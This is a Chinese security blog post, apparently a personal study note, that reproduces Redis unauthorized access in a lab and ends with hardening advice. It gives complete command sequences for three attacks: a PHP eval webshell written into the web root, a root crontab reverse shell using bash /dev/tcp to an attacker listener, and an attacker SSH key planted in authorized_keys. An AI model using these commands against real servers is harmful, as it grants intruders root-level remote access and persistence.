{"title":"redis未授权访问漏洞复现","uid":"d276b23f1cbe41c451a3655655515353","slug":"redis未授权访问漏洞复现","date":"2020-10-15T08:30:39.000Z","updated":"2020-10-18T06:08:20.000Z","comments":true,"path":"api/articles/redis未授权访问漏洞复现.json","keywords":"A1andNS","cover":[],"content":"<p>之前也遇到存在未授权问题的redis服务。这里熟悉一下redis未授权。</p>\n<h2 id=\"Redis环境搭建\"><a href=\"#Redis环境搭建\" class=\"headerlink\" title=\"Redis环境搭建\"></a>Redis环境搭建</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>redis version: 3.2.9</p>\n<p>Download Link：<a href=\"http://download.redis.io/releases/redis-3.2.9.tar.gz\">http://download.redis.io/releases/redis-3.2.9.tar.gz</a></p>\n<p>Operating System: CentOS Linux 7 (Core) x86_64</p></blockquote>\n<p>redis在安装完毕初始，只能使用本地访问，不允许ip访问，所以就需要去配置一下redis.conf才能使用网络ip访问。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Ubuntu是把redis.conf放在了&#x2F;etc&#x2F;redis&#x2F;redis.conf\n1)打开配置文件把下面对应的注释掉（或者可以针对自己的ip进行bind）\n# bind 127.0.0.1\n2)Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程，设置为no\ndaemonize no\n3)保护模式\nprotected-mode no\n4)重新启动配置文件才会生效：\nredis-server redis.conf（在redis.conf文件目录下执行）\n5)关闭防火墙service iptables stop\n6)出现如下信息说明环境已配置完成<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里有个重要的点一定要重启redis服务，不然配置无法生效，你还是无法连接上redis服务。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sudo killall redis-server\nsudo redis-server redis.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>然后就可以正常连接上redis了，而不会显示被拒绝。</p>\n<p>下面开始我们对redis的测试：</p>\n<h2 id=\"获取shell\"><a href=\"#获取shell\" class=\"headerlink\" title=\"获取shell\"></a>获取shell</h2><h3 id=\"0x01-通过向web目录中写webshell\"><a href=\"#0x01-通过向web目录中写webshell\" class=\"headerlink\" title=\"0x01 通过向web目录中写webshell\"></a>0x01 通过向web目录中写webshell</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>测试环境</p>\n<p>攻击机(Deepin)：192.168.3.41</p>\n<p>靶机(CentOS): 192.168.3.122</p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">192.168.3.122:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html\n192.168.3.122:6379&gt; config set dbfilename shell.php\n192.168.3.122:6379&gt; set x &quot;\\n\\n\\n&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\\n\\n\\n&quot;\n192.168.3.122:6379&gt; save<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018134935.png\" alt=\"1\"></p>\n<p>接下来使用antsword去连接我们的webshell。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018134956.png\" alt=\"连接\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018135046.png\" alt=\"getshell\"></p>\n<h3 id=\"0x02-利用写计划任务执行命令反弹shell\"><a href=\"#0x02-利用写计划任务执行命令反弹shell\" class=\"headerlink\" title=\"0x02 利用写计划任务执行命令反弹shell\"></a>0x02 利用写计划任务执行命令反弹shell</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>测试环境</p>\n<p>攻击机(Kali)：192.168.90.133</p>\n<p>靶机(CentOS): 192.168.90.132</p></blockquote>\n<p>现在我的kali上开启一个端口监听: <code>nc -lvnp 7777</code> ,然后利用redis是以root权限在运行是写crontab</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">192.168.90.132:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.90.133&#x2F;7777 0&gt;&amp;1\\n&quot;\n192.168.90.132:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron\n192.168.90.132:6379&gt; config set dbfilename root\n192.168.90.132:6379&gt; save<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>定时任务已经写入系统，之后就可以在kali上利用反弹过来的shell来进行操作了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018135130.png\" alt=\"反弹shell\"></p>\n<p>成功getshell，之前出现接受不到反弹shell的问题，这里要注意一点，在登陆centos时就要用root用户来登陆，这样写进去的定时任务才能被root用户定时启动，从而达到反弹shell的目的。</p>\n<h3 id=\"0x03-写ssh公钥，来getshell\"><a href=\"#0x03-写ssh公钥，来getshell\" class=\"headerlink\" title=\"0x03 写ssh公钥，来getshell\"></a>0x03 写ssh公钥，来getshell</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>测试环境</p>\n<p>攻击机(Kali)：192.168.90.133</p>\n<p>靶机(CentOS): 192.168.90.132</p></blockquote>\n<p>我现在kali上去生成一个公私钥文件。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018135204.png\" alt=\"ssh\"></p>\n<p>(echo -e “\\n\\n”; cat id_rsa.pub; echo -e “\\n\\n”) &gt; test.txt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018135227.png\" alt=\"1\"></p>\n<p>下面去链接redis服务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">kali@kali:~&#x2F;.ssh$ redis-cli -h 192.168.90.132\n192.168.90.132:6379&gt; set x &quot;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDL5&#x2F;sxDKVlQoxvaBy3gwuLJYl1miiC8Jt78AHjdcNvxIFab0ksmLaz61YdAA5MGgrRtAxVZq4hOGKKLCGcbJlVgDlINUDOw42TXgUlcgvrmVA7haovAE8bq6ZHMKDQwkWCqZiplc&#x2F;sqJQgdxL72j2vf3&#x2F;qFl&#x2F;GTwsO0MHkUgIUAQE7y+RFzwiVRN9noltUxHADQ2StrQcuJt1FVgsUNCJtrDOiRMggfjF&#x2F;7uVElk3nQsPoK7e7ERDFnZwah9IyqsOaylTInK4z10LBpRuCWT&#x2F;tfrmmAr3QLwLWRrXLEbF5KBqbQSdbx&#x2F;dUlHFFsZ7zd&#x2F;Xkla4Smu5&#x2F;uNF5stHJBU9kTvgvfF0ptH8+C3R&#x2F;LH7C0RlaOZxQAVBwI4v7JaC&#x2F;ScJg&#x2F;Px8fnRCkuScDvUvDrjDpM1nMw8OwiolvEUg3ziWhCKgoIOArfRRGT4pw2eGOUSZW&#x2F;8P31AbsCOILAUxZ7PDAN9kaR+K60idXe9FTVqY2v5XiGKJcNbFx7jFWVYokF0&#x3D; kali@kali\\n\\n&quot;\n192.168.90.132:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;\nOK\n192.168.90.132:6379&gt; config get dir\n1) &quot;dir&quot;\n2) &quot;&#x2F;root&#x2F;.ssh&quot;\n192.168.90.132:6379&gt; config set dbfilename &quot;authorized_keys&quot;\nOK\n192.168.90.132:6379&gt; save\nOK\n192.168.90.132:6379&gt; <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样就在.ssh中添加了一个authorized_keys文件里，然后我们现在执行ssh去连他，就可以getshell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20201018135321.png\" alt=\"getshell\"></p>\n<h2 id=\"修复方法\"><a href=\"#修复方法\" class=\"headerlink\" title=\"修复方法\"></a>修复方法</h2><p><strong>网上收集的一些修复建议：</strong></p>\n<p><strong>1.禁止一些高危命令</strong></p>\n<p>  修改 redis.conf 文件，添加<br>  rename-command FLUSHALL “”<br>  rename-command CONFIG “”<br>  rename-command EVAL “”<br>  来禁用远程修改 DB 文件地址</p>\n<p><strong>2.以低权限运行 Redis 服务</strong><br>  为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br> $ groupadd -r redis &amp;&amp; useradd -r -g redis redis</p>\n<p>root权限去运行redis服务是很危险的。</p>\n<p><strong>3.为 Redis 添加密码验证</strong><br>  修改 redis.conf 文件，添加<br>  requirepass mypassword</p>\n<p><strong>4.禁止外网访问 Redis</strong><br>  修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br>  bind 127.0.0.1</p>\n<p>上面的演示就说明了不实用bind的糟糕结果，bind 127.0.0.1可以有效的限制外网访问redis。</p>\n<p><strong>5.保证 authorized_keys 文件的安全</strong><br>  为了保证安全，您应该阻止其他用户添加新的公钥。<br>  将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br>$ chmod 400 ~/.ssh/authorized_keys<br>  为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br># chattr +i ~/.ssh/authorized_keys<br>  然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br># chattr +i ~/.ssh<br>  注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>\n<p>这个很重要，最后一种方法即使利用这个写了一个这个文件，从而实现ssh连接服务器getshell。</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p>[1]. <a href=\"http://dwz.date/cR9H\">http://dwz.date/cR9H</a></p>\n","text":"之前也遇到存在未授权问题的redis服务。这里熟悉一下redis未授权。 Redis环境搭建 redis version: 3.2.9 Download Link：http://download.redis.io/releases/redis-3.2.9.tar.gz Opera...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":33,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":6,"path":"api/tags/漏洞复现.json"},{"name":"redis","slug":"redis","count":1,"path":"api/tags/redis.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Redis%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">Redis环境搭建</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96shell\"><span class=\"toc-text\">获取shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E9%80%9A%E8%BF%87%E5%90%91web%E7%9B%AE%E5%BD%95%E4%B8%AD%E5%86%99webshell\"><span class=\"toc-text\">0x01 通过向web目录中写webshell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E5%88%A9%E7%94%A8%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">0x02 利用写计划任务执行命令反弹shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-%E5%86%99ssh%E5%85%AC%E9%92%A5%EF%BC%8C%E6%9D%A5getshell\"><span class=\"toc-text\">0x03 写ssh公钥，来getshell</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">修复方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUUOJ刷题20201019-25","uid":"7de36a2800aed7f2e49e9214b2b8f9f5","slug":"BUUOJ刷题20201019-25","date":"2020-10-25T01:49:01.000Z","updated":"2021-06-28T14:58:06.209Z","comments":true,"path":"api/articles/BUUOJ刷题20201019-25.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[ZJCTF 2019]NiZhuanSiWei考点：代码审计、PHP伪协议 &lt;?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SUCTF","slug":"SUCTF","count":2,"path":"api/tags/SUCTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUU刷题2020-10-12-18","uid":"683add4f9a49dbf4bd3c49ba47208ffa","slug":"BUU刷题2020-10-12-18","date":"2020-10-13T10:28:01.000Z","updated":"2021-06-28T14:57:34.348Z","comments":true,"path":"api/articles/BUU刷题2020-10-12-18.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","text":"[极客大挑战 2019]LoveSQL考点：SQL注入 试了一下，在password处构造万能密码登陆 &#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20or%201&#x3D;1%23 得到了一个密码是...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":14,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}